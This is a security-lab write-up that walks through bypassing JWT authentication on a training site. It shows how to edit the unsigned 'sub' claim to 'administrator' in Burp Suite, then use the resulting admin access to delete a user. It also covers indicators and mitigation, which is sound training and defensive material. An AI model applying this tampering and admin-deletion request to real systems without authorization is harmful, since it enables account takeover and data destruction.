# Lab01 - JWT Authentication Bypass Via Unverified Signature

## Objective

Modify the JWT session token to gain access to:

```text
/admin
```

Then delete the user:

```text
carlos
```

Credentials:

```text
wiener:peter
```

---

# Vulnerability Overview

The application uses JWTs for session handling.

However, due to an implementation flaw, the server does not verify JWT signatures.

This means an attacker can modify the token payload and the server still trusts the claims.

---

# Vulnerable Flow

```text
JWT Received
        ↓
JWT Decoded
        ↓
Signature NOT Verified
        ↓
Claims Trusted
```

The application effectively trusts attacker-controlled JWT data.

---

# Analysis & Exploitation Steps

## Step 1 - Log In

Log in using:

```text
wiener:peter
```

---

## Step 2 - Identify The JWT

In Burp Suite:

```text
Proxy
        ↓
HTTP history
```

Find the post-login request:

```http
GET /my-account
```

Observe that the session cookie contains a JWT.

JWT structure:

```text
HEADER.PAYLOAD.SIGNATURE
```

---

## Step 3 - Inspect The Payload

Double-click the payload section of the JWT.

Using Burp Inspector, view the decoded JSON.

The payload contains the `sub` claim.

Example:

```json
{
  "sub": "wiener"
}
```

The application uses this claim to identify the current user.

Send the request to Burp Repeater.

---

## Step 4 - Test Admin Access

Change the request path:

```http
GET /admin
```

Send the request.

The server denies access because the current JWT represents:

```text
wiener
```

---

## Step 5 - Modify The JWT Claim

Select the JWT payload.

Change:

```json
{
  "sub": "wiener"
}
```

To:

```json
{
  "sub": "administrator"
}
```

Click:

```text
Apply changes
```

The JWT payload is modified.

The original signature is now technically invalid.

---

## Step 6 - Send The Modified JWT

Send the request again:

```http
GET /admin
```

The application accepts the modified JWT.

Admin panel access is granted.

---

## Step 7 - Delete Carlos

From the admin panel response, identify:

```http
/admin/delete?username=carlos
```

Send the request.

Lab solved.

---

# Why The Attack Works

The application decodes the JWT but does not verify its signature.

```text
Original JWT
        ↓
Modify sub Claim
        ↓
Signature Becomes Invalid
        ↓
Server Ignores Signature
        ↓
administrator Trusted
```

---

# Personal Analysis & Testing Process

The important observation was:

```text
sub = wiener
```

This suggested that the JWT claim controls user identity.

My testing logic:

```text
Identify JWT
        ↓
Decode Payload
        ↓
Find Identity Claim
        ↓
Modify Claim
        ↓
Replay Token
```

The key test is simple:

```text
Modify JWT Without Re-Signing
```

If the server still accepts the token:

```text
SIGNATURE VERIFICATION MAY BE MISSING
```

---

# Bug Bounty Indicators

Look for:

```text
JWT Session Cookies
User Identity In Claims
role Claims
isAdmin Claims
sub Claims
```

Modify a non-destructive claim in an authorized testing environment and observe whether signature validation occurs.

---

# Impact

```text
Authentication Bypass
User Impersonation
Privilege Escalation
Administrative Access
```

---

# Mitigation

Applications must:

```text
Verify JWT Signature
Before Trusting Claims
```

Never use a decode-only operation for authentication decisions.

---

# Related Theory

```text
04-jwt-attacks-overview.md
05-flawed-signature-verification.md
06-unverified-signatures.md
```

---

# Key Learnings

- JWT decoding is not verification.
- `sub` may directly control user identity.
- Modified claims must never be trusted without signature verification.
- Always test whether JWT payload changes invalidate the session.